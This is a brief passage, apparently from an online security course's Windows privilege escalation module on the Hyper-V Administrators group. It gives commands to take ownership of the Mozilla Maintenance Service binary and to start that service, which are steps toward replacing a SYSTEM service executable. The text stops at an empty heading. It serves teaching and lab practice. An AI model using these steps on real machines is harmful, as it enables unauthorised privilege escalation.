<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/67/section/604
// Platform Version: V1
// Module ID: 67
// Module Name: Windows Privilege Escalation
// Module Difficulty: Medium
// Section ID: 604
// Section Title: Hyper-V Administrators
// Page Title: Windows Privilege Escalation
// Page Number: 13
-->

# Hyper-V Administrators

**Module Name:** Windows Privilege Escalation **Page Number:** 13

#### WINDOWS PRIVILEGE ESCALATION

# Hyper-V Administrators

#### Target File

```shell-session
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

#### Taking Ownership of the File

```cmd-session
C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

#### Starting the Mozilla Maintenance Service

```cmd-session
C:\htb> sc.exe start MozillaMaintenance
```

####